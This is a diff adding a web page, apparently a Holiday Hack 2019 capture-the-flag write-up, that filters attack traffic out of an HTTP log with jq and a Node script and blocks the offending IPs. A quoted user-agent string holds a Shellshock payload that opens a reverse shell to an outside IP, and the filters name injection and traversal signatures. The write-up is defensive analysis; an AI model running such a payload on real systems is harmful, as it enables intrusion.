@@ -1,0 +1,197 @@
+<!DOCTYPE html5>
+<html>
+	<head>
+		<title>endgame | Holiday Hack 2019</title>
+		<link rel="stylesheet" href="/css/common.css">
+		<link rel="stylesheet" href="/css/writeup.css">
+		<link rel="stylesheet" href="/css/pygments.css">
+		<link rel="stylesheet" href="https://unpkg.com/normalize.css@8.0.1/normalize.css">
+		
+		<meta charset="utf-8" />
+	</head>
+	<body>
+		<main>
+			<h1>Filter out poisoned sources of Weather Data</h1>
+<p>We're given the link to a web interface and a gzipped log file. First, let's get into the web interface.</p>
+<p>You might remember that <a href="recover-document.html">challenge 10</a> gives you a PDF documenting the new sleigh navigation system. If you browse through this PDF you'll find it mentions the default username/password are in the <code>README.md</code>.</p>
+<p>If we go to the interface <code>/README.md</code>, we can download the readme and find the default password:</p>
+<div class="codehilite"><pre><span></span>You can login using the default admin pass:
+
+`admin 924158F9522B3744F5FCD4D10FAC4356`
+</pre></div>
+
+
+<p>Now that we're in the web interface we can look at the API docs:</p>
+<div class="codehilite"><pre><span></span>To Update The Measurements For a Specific Global Elf Weather Station:
+
+HTTP POST REQUEST TO http://srf.elfu.org/api/measurements
+Content-Type: application/json
+
+{
+  &quot;coord&quot;: {
+    &quot;lon&quot;: 19.04,
+    &quot;lat&quot;: 47.5
+  },
+  &quot;weather&quot;: [
+    {
+      &quot;id&quot;: 701,
+      &quot;main&quot;: &quot;Mist&quot;,
+      &quot;description&quot;: &quot;mist&quot;,
+      &quot;icon&quot;: &quot;50d&quot;
+    }
+  ],
+  &quot;base&quot;: &quot;stations&quot;,
+  &quot;main&quot;: {
+    &quot;temp&quot;: 3,
+    &quot;pressure&quot;: 1016,
+    &quot;humidity&quot;: 74,
+    &quot;temp_min&quot;: 3,
+    &quot;temp_max&quot;: 3
+  },
+  &quot;visibility&quot;: 5000,
+  &quot;wind&quot;: {
+    &quot;speed&quot;: 1.5
+  },
+  &quot;clouds&quot;: {
+    &quot;all&quot;: 75
+  },
+  &quot;dt&quot;: 1518174000,
+  &quot;sys&quot;: {
+    &quot;type&quot;: 1,
+    &quot;id&quot;: 5724,
+    &quot;message&quot;: 0.0038,
+    &quot;country&quot;: &quot;HU&quot;,
+    &quot;sunrise&quot;: 1518155907,
+    &quot;sunset&quot;: 1518191898
+  },
+  &quot;station_id&quot;: &quot;abcd1234&quot;,
+  &quot;name&quot;: &quot;Budapest&quot;,
+  &quot;cod&quot;: 200
+}
+
+All Station IDS: GET /api/stations
+All Stations Weather Data: GET /api/weather?station_id=*
+One Stations Weather Data: GET /api/weather?station_id=abcd1234
+Multiple Specific Stations Weather Data: GET /api/weather?station_id=abcd1234,abcd1235
+</pre></div>
+
+
+<p>So now we know the poison requests will be <code>POST /api/measurements</code>. Let's start looking through our logs. First, look at the structure for each object:</p>
+<div class="codehilite"><pre><span></span>$ jq &#39;.[0]&#39; http.log
+{
+  &quot;ts&quot;: &quot;2019-10-05T06:50:42-0800&quot;,
+  &quot;uid&quot;: &quot;ClRV8h1vYKWXN1G5ke&quot;,
+  &quot;id.orig_h&quot;: &quot;238.27.231.56&quot;,
+  &quot;id.orig_p&quot;: 60677,
+  &quot;id.resp_h&quot;: &quot;10.20.3.80&quot;,
+  &quot;id.resp_p&quot;: 80,
+  &quot;trans_depth&quot;: 1,
+  &quot;method&quot;: &quot;GET&quot;,
+  &quot;host&quot;: &quot;srf.elfu.org&quot;,
+  &quot;uri&quot;: &quot;/14.10/Google/&quot;,
+  &quot;referrer&quot;: &quot;-&quot;,
+  &quot;version&quot;: &quot;1.0&quot;,
+  &quot;user_agent&quot;: &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2b4) Gecko/20091124 Firefox/3.6b4 (.NET CLR 3.5.30729)&quot;,
+  &quot;origin&quot;: &quot;-&quot;,
+  &quot;request_body_len&quot;: 0,
+  &quot;response_body_len&quot;: 232,
+  &quot;status_code&quot;: 404,
+  &quot;status_msg&quot;: &quot;Not Found&quot;,
+  &quot;info_code&quot;: &quot;-&quot;,
+  &quot;info_msg&quot;: &quot;-&quot;,
+  &quot;tags&quot;: &quot;(empty)&quot;,
+  &quot;username&quot;: &quot;-&quot;,
+  &quot;password&quot;: &quot;-&quot;,
+  &quot;proxied&quot;: &quot;-&quot;,
+  &quot;orig_fuids&quot;: &quot;-&quot;,
+  &quot;orig_filenames&quot;: &quot;-&quot;,
+  &quot;orig_mime_types&quot;: &quot;-&quot;,
+  &quot;resp_fuids&quot;: &quot;FUPWLQXTNsTNvf33&quot;,
+  &quot;resp_filenames&quot;: &quot;-&quot;,
+  &quot;resp_mime_types&quot;: &quot;text/html&quot;
+}
+</pre></div>
+
+
+<p>We're told there's probably a bunch of nasty stuff, so we can look for common web attack techniques in the logs. We'll match based on some generic stuff then put all the IPs in a file:</p>
+<div class="codehilite"><pre><span></span>$ <span class="c1"># SQLi</span>
+$ jq <span class="s1">&#39;. | map(select(.uri | contains(&quot;&#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39;&quot;))) | map(.&quot;id.orig_h&quot;)&#39;</span> http.log &gt; bad_ips
+$ jq <span class="s1">&#39;. | map(select(.user_agent | contains(&quot;&#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39;&quot;))) | map(.&quot;id.orig_h&quot;)&#39;</span> http.log &gt;&gt; bad_ips
+$ jq <span class="s1">&#39;. | map(select(.username | contains(&quot;&#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39;&quot;))) | map(.&quot;id.orig_h&quot;)&#39;</span> http.log &gt;&gt; bad_ips
+
+$ <span class="c1"># LFI</span>
+$ jq <span class="s1">&#39;. | map(select(.uri | contains(&quot;../&quot;))) | map(.&quot;id.orig_h&quot;)&#39;</span> http.log &gt;&gt; bad_ips
+$ jq <span class="s1">&#39;. | map(select(.uri | contains(&quot;pass&quot;))) | map(.&quot;id.orig_h&quot;)&#39;</span> http.log &gt;&gt; bad_ips
+
+$ <span class="c1"># XSS</span>
+$ jq <span class="s1">&#39;. | map(select(.uri | contains(&quot;&lt;&quot;))) | map(.&quot;id.orig_h&quot;)&#39;</span> http.log &gt;&gt; bad_ips
+$ jq <span class="s1">&#39;. | map(select(.host | contains(&quot;&lt;&quot;))) | map(.&quot;id.orig_h&quot;)&#39;</span> http.log &gt;&gt; bad_ips
+
+$ <span class="c1"># Shellshock</span>
+$ jq <span class="s1">&#39;. | map(select(.uri | contains(&quot;:; };&quot;))) | map(.&quot;id.orig_h&quot;)&#39;</span> http.log &gt;&gt; bad_ips
+$ jq <span class="s1">&#39;. | map(select(.user_agent | contains(&quot;:; };&quot;))) | map(.&quot;id.orig_h&quot;)&#39;</span> http.log &gt;&gt; bad_ips
+
+$ <span class="c1"># Flatten a bunch of concatenated arrays</span>
+$ jq -s <span class="s1">&#39;. | flatten&#39;</span> bad_ips &gt; bad_ips_clean
+$ jq <span class="s1">&#39;. | length&#39;</span> bad_ips_clean
+<span class="m">89</span>
+</pre></div>
+
+
+<p>This targets, in order, LFI, SQL Injection, Shellshock, and XSS.</p>
+<p>Now we can try to find other requests that have things in common with these, such as user agents. You can repeat the above script, replacing <code>."id.orig_h"</code> with <code>.user_agent</code> to find all the useragents that were responsible for a malicious request.</p>
+<div class="codehilite"><pre><span></span>$ cat bad_agents
+[
+  &quot;Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.&quot;,
+  &quot;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0)&quot;,
+  &quot;Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)&quot;,
+  [ ... ]
+  &quot;() { :; }; /usr/bin/ruby -rsocket -e&#39;f=TCPSocket.open(\&quot;227.110.45.126\&quot;,43870).to_i;exec sprintf(\&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\&quot;,f,f,f)&#39;&quot;
+]
+</pre></div>
+
+
+<p>There's a chance some of these are actually normal though, so we'll not use useragents that end up being too common (&gt;= 9 requests). From there, we just need to search for IPs that used any useragent on that list. I used Node for this part:</p>
+<div class="codehilite"><pre><span></span><span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">sus_agents</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;./bad_agents&#39;</span><span class="p">));</span>
+<span class="kd">var</span> <span class="nx">all_records</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;./http.log&#39;</span><span class="p">));</span>
+
+<span class="kd">var</span> <span class="nx">agent_counts</span> <span class="o">=</span> <span class="nx">sus_agents</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">x</span> <span class="p">=&gt;</span> <span class="p">({</span><span class="nx">count</span><span class="o">:</span> <span class="nx">all_records</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">y</span> <span class="p">=&gt;</span> <span class="nx">y</span><span class="p">.</span><span class="nx">user_agent</span> <span class="o">==</span> <span class="nx">x</span><span class="p">).</span><span class="nx">length</span><span class="p">,</span> <span class="nx">agent</span><span class="o">:</span> <span class="nx">x</span><span class="p">}));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Suspicious agents: &quot;</span> <span class="o">+</span> <span class="nx">agent_counts</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+
+<span class="kd">var</span> <span class="nx">bad_agents</span> <span class="o">=</span> <span class="nx">agent_counts</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">x</span> <span class="p">=&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nx">count</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">x</span> <span class="p">=&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nx">agent</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Probably bad agents: &quot;</span> <span class="o">+</span> <span class="nx">bad_agents</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+
+<span class="kd">var</span> <span class="nx">filtered</span> <span class="o">=</span> <span class="nx">all_records</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">x</span> <span class="p">=&gt;</span> <span class="nx">bad_agents</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">user_agent</span><span class="p">));</span>
+<span class="nx">filtered</span> <span class="o">=</span> <span class="nx">filtered</span><span class="p">.</span><span class="nx">filter</span><span class="p">((</span><span class="nx">x</span><span class="p">,</span> <span class="nx">i</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">filtered</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="o">===</span> <span class="nx">i</span><span class="p">);</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Found &quot;</span> <span class="o">+</span> <span class="nx">filtered</span><span class="p">.</span><span class="nx">length</span> <span class="o">+</span> <span class="s2">&quot; unique IPs:&quot;</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">filtered</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">x</span> <span class="p">=&gt;</span> <span class="nx">x</span><span class="p">[</span><span class="s1">&#39;id.orig_h&#39;</span><span class="p">]).</span><span class="nx">join</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">));</span>
+</pre></div>
+
+
+<div class="codehilite"><pre><span></span>$ node pivot.js
+Suspicious agents: 89
+Probably bad agents: 72
+Found 97 unique IPs:
+42.103.246.250, 42.103.246.130, 42.103.246.130, 42.103.246.130, ...
+</pre></div>
+
+
+<p>Now we just need to paste our comma-seperated list into the firewall, hit deny, and we get our token.</p>
+		</main>
+
+		<footer>
+			<div class="links">
+				<div>
+					<a aria-label="Back" href="index.html">
+						<span class="iconify" data-icon="fa:arrow-left"></span>
+					</a>
+				</div>
+				<div>
+			</div>
+		</footer>
+
+		<script src="https://code.iconify.design/1/1.0.3/iconify.min.js"></script>
+	</body>
+</html>
